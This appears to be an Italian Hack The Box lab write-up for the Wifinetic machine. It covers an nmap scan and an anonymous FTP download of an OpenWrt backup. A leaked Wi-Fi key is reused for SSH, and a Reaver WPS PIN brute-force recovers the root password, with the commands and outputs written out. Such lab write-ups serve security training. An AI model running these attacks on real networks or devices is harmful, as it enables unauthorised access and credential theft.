**TARGET: 10.10.11.247**

# INFORMATION GATHERING

Per prima cosa lanciamo un veloce scan con [Nmap](Note/Tool/Nmap.md)

```shell-session
┌──(kali㉿kali)-[~/htb/wifinetic]
└─$ nmap -sT -sV -min-rate=5000 10.10.11.247
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-03 20:29 CET
Nmap scan report for 10.10.11.247
Host is up (0.082s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.51 seconds

```

Aggiungiamo anche la flag `-sC` per provare un serie di script di default di nmap

```shell-session

┌──(kali㉿kali)-[~/htb/wifinetic]
└─$ nmap -sT -sV -sC -min-rate=5000 10.10.11.247
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-03 20:29 CET
Nmap scan report for 10.10.11.247
Host is up (0.068s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.48
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.35 seconds
```

Ok abbiamo un po più d'informazioni, un ulteriore scan su tutte le porte non ci da nessuna nuova informazione. Quindi ricapitolando abbiamo:

- 21 ftp        vsftpd 3.0.3
- 22 ssh        OpenSSH 8.2p1
- 53  tcpwrapped

# ENUMERATION

Dallo scan di nmap abbiamo visto l'accesso anonymous in ftp è abilitato quindi partiamo da li 

```shell-session
┌──(kali㉿kali)-[~/htb/wifinetic]
└─$ ftp anonymous@10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||45865|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
```

abbiamo diversi da file da scaricare e da guardare, gli scarichiamo 
```shell-session
ftp> mget MigrateOpenWrt.txt ProjectGreatMigration.pdf ProjectOpenWRT.pdf backup-OpenWrt-2023-07-26.tar employees_wellness.pdf
mget MigrateOpenWrt.txt [anpqy?]? yes
229 Entering Extended Passive Mode (|||45098|)
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
100% |**********************************************************************************************************************************************************************************************|  4434        8.79 MiB/s    00:00 ETA
226 Transfer complete.
4434 bytes received in 00:00 (90.90 KiB/s)
mget ProjectGreatMigration.pdf [anpqy?]? yes
229 Entering Extended Passive Mode (|||40796|)
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
100% |**********************************************************************************************************************************************************************************************|  2442 KiB    2.20 MiB/s    00:00 ETA
226 Transfer complete.
2501210 bytes received in 00:01 (2.10 MiB/s)
mget ProjectOpenWRT.pdf [anpqy?]? yes
229 Entering Extended Passive Mode (|||42499|)
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
100% |**********************************************************************************************************************************************************************************************| 60857      595.99 KiB/s    00:00 ETA
226 Transfer complete.
60857 bytes received in 00:00 (407.51 KiB/s)
mget backup-OpenWrt-2023-07-26.tar [anpqy?]? yes
229 Entering Extended Passive Mode (|||42617|)
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
100% |**********************************************************************************************************************************************************************************************| 40960      772.78 KiB/s    00:00 ETA
226 Transfer complete.
40960 bytes received in 00:00 (389.41 KiB/s)
mget employees_wellness.pdf [anpqy?]? yes
229 Entering Extended Passive Mode (|||46217|)
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
100% |**********************************************************************************************************************************************************************************************| 52946      563.10 KiB/s    00:00 ETA
226 Transfer complete.
52946 bytes received in 00:00 (379.39 KiB/s)
ftp>
```

Per prima cosa, andiamo a leggere `MigrateOpenWrt.txt`

```shell-session
┌──(kali㉿kali)-[~/htb/wifinetic]
└─$ cat MigrateOpenWrt.txt
  +-------------------------------------------------------+
  |             Replace OpenWRT with Debian                |
  +-------------------------------------------------------+
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |        Evaluate Current OpenWRT Setup        |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Plan and Prepare the Migration       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Inventory current hardware and software   |    |
  |  |   - Identify dependencies and customizations  |    |
  |  |   - Research Debian-compatible alternatives   |    |
  |  |   - Backup critical configurations and data   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |            Install Debian on Devices         |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Obtain latest Debian release              |    |
  |  |   - Check hardware compatibility              |    |
  |  |   - Flash/install Debian on each device       |    |
  |  |   - Verify successful installations           |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Set Up Networking and Services       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Configure network interfaces              |    |
  |  |   - Install and configure Wifi drivers        |    |
  |  |   - Set up DHCP, DNS, and routing             |    |
  |  |   - Install firewall and security measures    |    |
  |  |   - Set up any additional services needed     |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |           Migrate Configurations             |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Adapt OpenWRT configurations to Debian    |    |
  |  |   - Migrate custom settings and scripts       |    |
  |  |   - Ensure compatibility with new system      |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |          Test and Troubleshoot               |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Test Wifi connectivity and performance    |    |
  |  |   - Verify all services are functioning       |    |
  |  |   - Address and resolve any issues            |    |
  |  |   - Test for security issues with Reaver tool |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Monitor and Maintain                 |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Implement regular updates and patches     |    |
  |  |   - Monitor system health and performance     |    |
  |  |   - Maintain and optimize the Debian system   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  +-------------------------------------------------------+
```

Abbiamo tutti gli step necessaria ad un  Sostituzione di OpenWRT con Debian.
Lo step successivo è quello di estrarre `backup-OpenWrt-2023-07-26.tar `  e lo facciamo con `tar`

```shell-session
┌──(kali㉿kali)-[~/htb/wifinetic]
└─$ tar -xf backup-OpenWrt-2023-07-26.tar
```

esploriamo il contenuto 

```shell-session
┌──(kali㉿kali)-[~/htb/wifinetic/etc]
└─$ ls
config  dropbear  group  hosts  inittab  luci-uploads  nftables.d  opkg  passwd  profile  rc.local  shells  shinit  sysctl.conf  uhttpd.crt  uhttpd.key
```

troviamo quello che sembra la copia dell'`/etc/passwd`

```shell-session
┌──(kali㉿kali)-[~/htb/wifinetic/etc]
└─$ cat passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

abbiamo l'utente `netadmin` che ha la sua home,
andiamo avanti ad esplorare...

all'interno `wireless` abbiamo quelle che sembra la configurazione della rete wireless.

```shell-session
┌──(kali㉿kali)-[~/htb/wifinetic/etc/config]
└─$ cat wireless

config wifi-device 'radio0'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim0'
        option cell_density '0'
        option channel 'auto'
        option band '2g'
        option txpower '20'

config wifi-device 'radio1'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim1'
        option channel '36'
        option band '5g'
        option htmode 'HE80'
        option cell_density '0'

config wifi-iface 'wifinet0'
        option device 'radio0'
        option mode 'ap'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
        option wps_pushbutton '1'

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
```

notiamo che le due reti `wifinet0` e `wifinet1` hanno la stessa password, questo ci può suggerire che la stessa password potrebbe essere riutilizzata anche per altri servizi...
Proviamo a utilizzare per connetterci in ssh con l'utente `netadmin`

```shell-session
┌──(kali㉿kali)-[~/htb/sau/CVE-2023-27163]
└─$ ssh netadmin@10.10.11.247
The authenticity of host '10.10.11.247 (10.10.11.247)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:29: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.247' (ED25519) to the list of known hosts.
netadmin@10.10.11.247's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 03 Dec 2023 07:49:34 PM UTC

  System load:            0.0
  Usage of /:             64.6% of 4.76GB
  Memory usage:           6%
  Swap usage:             0%
  Processes:              226
  Users logged in:        0
  IPv4 address for eth0:  10.10.11.247
  IPv6 address for eth0:  dead:beef::250:56ff:feb9:94fd
  IPv4 address for wlan0: 192.168.1.1
  IPv4 address for wlan1: 192.168.1.23

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Sep 12 12:46:00 2023 from 10.10.14.23
netadmin@wifinetic:~$ ls
```

e siamo dentro ! 

ci prendiamo la nostra user_flag

```shell-session
netadmin@wifinetic:~$ cat user.txt
b5f5e029924e15c04d526d261c0102bb
```

# PRIVESC

Enumerando i processi ci salta l'occhio `hostapd`

```shell-session
netadmin@wifinetic:/etc$ ps -aux
...<snip>...
root       42904  0.0  0.0      0     0 ?        I    20:49   0:00 [kworker/1:3-rcu_gp]
root       43131  0.0  0.0  10236  2964 ?        Ss   20:52   0:00 /usr/sbin/hostapd -B -P /run/hostapd.pid -B /etc/hostapd/hostapd.conf
root       43134  0.1  0.2  13936  9276 ?        Ss   20:52   0:00 /sbin/wpa_supplicant -u -s -c /etc/wpa_supplicant.conf -i wlan1
root       43157  0.0  0.0   5476   516 ?        S    20:52   0:00 sleep 30
...<snip>...
```

hostapd è un software daemon per lo spazio utente che consente a una scheda di interfaccia di rete di fungere da punto di accesso e server di autenticazione.
quindi andiamo a vedere le interfacce di rete attive sulla macchina 

```shell-session
netadmin@wifinetic:/etc$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:94fd  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:94fd  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:94:fd  txqueuelen 1000  (Ethernet)
        RX packets 90731  bytes 7636949 (7.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 87761  bytes 8102285 (8.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 16858  bytes 1012020 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16858  bytes 1012020 (1.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 71626  bytes 12610665 (12.6 MB)
        RX errors 0  dropped 71626  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 2389  bytes 225262 (225.2 KB)
        RX errors 0  dropped 328  overruns 0  frame 0
        TX packets 2778  bytes 322177 (322.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 707  bytes 97899 (97.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2389  bytes 268264 (268.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

eth0 è l'interfaccia LAN standard che ha l'IP 10.10.11.247 che ho attaccato. lo è l'interfaccia localhost standard con 127.0.0.1.

Le interfacce mon (come mon0) vengono generalmente utilizzate per le interfacce in modalità monitor. Viene utilizzato per lo sniffing e il monitoraggio del traffico su una rete WiFi. le interfacce WLAN (come le altre tre) vengono utilizzate per l'interfacciamento con le reti wireless.

Le impostazioni wireless sono generalmente archiviate in /etc/wpa_supplicant.conf, che è presente, ma netadmin non può leggerlo:

```shell-session
netadmin@wifinetic:/etc$ cat wpa_supplicant.conf cat: wpa_supplicant.conf: Permission denied
```

`iw dev` fornirà maggiori informazioni sulle interfacce wireless:

```shell-session
netadmin@wifinetic:/etc$ iw dev
phy#2
        Interface mon0
                ifindex 7
                wdev 0x200000002
                addr 02:00:00:00:02:00
                type monitor
                txpower 20.00 dBm
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm
phy#1
        Unnamed/non-netdev interface
                wdev 0x1000000c3
                addr 42:00:00:00:01:00
                type P2P-device
                txpower 20.00 dBm
        Interface wlan1
                ifindex 4
                wdev 0x100000001
                addr 02:00:00:00:01:00
                ssid OpenWrt
                type managed
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 02:00:00:00:00:00
                ssid OpenWrt
                type AP
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
```

In base all'output del comando iw, abbiamo ottenuto dettagli più specifici sulle interfacce di rete e sulle loro configurazioni:

-  wlan0: questa interfaccia è classificata come AP (Access Point) ed è associata a phy0 , che rappresenta il dispositivo wireless fisico. Come previsto, ciò conferma che wlan0 è effettivamente il punto di accesso nella configurazione OpenWRT.
-  wlan1: questa interfaccia è classificata come gestita e ha un tipo di interfaccia non-net-dev P2P-. La modalità gestita indica che wlan1 viene utilizzato come un normale client Wi-Fi e che Il tipo di dispositivo P2P suggerisce che potrebbe supportare Wi-Fi Direct o comunicazioni peer-to-peer.
-  phy2, wlan2 e mon0: queste interfacce sono collegate a phy2 che rappresenta un dispositivo   wireless fisico separato. wlan2 è classificata come interfaccia gestita, mentre mon0 è i    impostato modalità monitor. La presenza sia di wlan2 che di mon0 su phy2 indica che fanno parte della stessa scheda wireless.

Dopo aver stabilito i ruoli di ciascuna interfaccia e le relative associazioni con specifici dispositivi fisici, possiamo sfruttare wlan2 e mon0 su phy2 per il monitoraggio delle attività. In base alla struttura della rete e alle informazioni ottenute dalla nostra enumerazione, ecco come è progettata la rete di questa macchina:

Il tentativo di forzare il PIN WPS potrebbe potenzialmente portare all'ottenimento della password Wi-Fi effettiva.

WiFi Protected Setup (WPS) è uno standard progettato per facilitare l'accesso a un router WiFi, soprattutto in ambito domestico. Sul dispositivo sarebbe stampato un pin di 8 cifre e l'utente potrebbe inserire quel pin per connettersi alla rete.

C'è un problema con l'implementazione che rende banale la forza bruta del pin a 8 cifre. In teoria, questo avrebbe dovuto offrire cento milioni di possibili pin. In pratica, il sistema WPS ti dirà se le prime quattro cifre sono corrette, e poi se le tre cifre successive sono corrette. Utilizza anche l'ultima cifra come checksum. Ciò significa che per applicare la forza bruta in modo efficace, un utente malintenzionato deve provare solo 10.000 possibilità per i primi quattro, 1.000 per i successivi quattro o al massimo 11.000 birilli (molto meno di cento milioni!).

Reaver è uno strumento utilizzato per recuperare la rete WPA PSK (password) mediante forzatura bruta del pin WPS.

fortunatamente reaver è installato sulla macchina vittima 

```shell-session
netadmin@wifinetic:/etc$ reaver 

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

Required Arguments:
        -i, --interface=<wlan>          Name of the monitor-mode interface to use
        -b, --bssid=<mac>               BSSID of the target AP

Optional Arguments:
        -m, --mac=<mac>                 MAC of the host system
        -e, --essid=<ssid>              ESSID of the target AP
        -c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)
        -s, --session=<file>            Restore a previous session file
        -C, --exec=<command>            Execute the supplied command upon successful pin recovery
        -f, --fixed                     Disable channel hopping
        -5, --5ghz                      Use 5GHz 802.11 channels
        -v, --verbose                   Display non-critical warnings (-vv or -vvv for more)
        -q, --quiet                     Only display critical messages
        -h, --help                      Show help

Advanced Options:
        -p, --pin=<wps pin>             Use the specified pin (may be arbitrary string or 4/8 digit WPS pin)
        -d, --delay=<seconds>           Set the delay between pin attempts [1]
        -l, --lock-delay=<seconds>      Set the time to wait if the AP locks WPS pin attempts [60]
        -g, --max-attempts=<num>        Quit after num pin attempts
        -x, --fail-wait=<seconds>       Set the time to sleep after 10 unexpected failures [0]
        -r, --recurring-delay=<x:y>     Sleep for y seconds every x pin attempts
        -t, --timeout=<seconds>         Set the receive timeout period [10]
        -T, --m57-timeout=<seconds>     Set the M5/M7 timeout period [0.40]
        -A, --no-associate              Do not associate with the AP (association must be done by another application)
        -N, --no-nacks                  Do not send NACK messages when out of order packets are received
        -S, --dh-small                  Use small DH keys to improve crack speed
        -L, --ignore-locks              Ignore locked state reported by the target AP
        -E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet
        -J, --timeout-is-nack           Treat timeout as NACK (DIR-300/320)
        -F, --ignore-fcs                Ignore frame checksum errors
        -w, --win7                      Mimic a Windows 7 registrar [False]
        -K, --pixie-dust                Run pixiedust attack
        -Z   
```

Ho bisogno del nome dell'interfaccia in modalità monitor e del BSSID dell'AP di destinazione. L'esempio in basso, reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv mostra che il BSSID sembra un indirizzo MAC e, in effetti, lo è.
L'AP di destinazione è wlan0, che ha un MAC dal comando iw sopra di 02:00:00:00:00:00. L'interfaccia in modalità monitor è mon0. La maggior parte dei tutorial sui reaver mostrano l'uso del comando wash per ottenere il BSSID/MAC


```shell-session 
netadmin@wifinetic:/etc$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

Sulla base dell'enumerazione precedente, abbiamo visto che è molto probabile che l'utente del sistema riutilizzi le  password tra account diversi. Possiamo provare a riutilizzare questa password con l' utente root e vedere se funziona.

```
netadmin@wifinetic:/etc$ su root
Password:
root@wifinetic:/etc# 

```

e ci prendiamo la nostra root_flag

```shell-session
root@wifinetic:/etc# cat /root/root.txt
52e85849b1fb88b27a4aa83686ca0be7
```

